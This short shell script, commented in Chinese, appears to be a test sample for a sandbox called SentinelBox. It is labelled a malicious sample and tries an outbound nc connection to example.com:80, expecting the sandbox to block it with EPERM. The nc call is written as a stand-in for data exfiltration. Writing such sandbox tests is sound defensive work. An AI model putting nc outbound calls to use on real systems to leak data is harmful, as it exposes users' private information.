#!/bin/sh
# 惡意樣本：嘗試對外建立網路連線外洩隱私。
# Strict profile 下 connect() 會被 NOTIFY 攔截並回傳 EPERM。
echo "[mal_net] 嘗試 nc 連線 example.com:80 ..."
echo GET / | nc -w 2 example.com 80 || echo "[mal_net] 失敗 (預期：被 SentinelBox 攔截)"
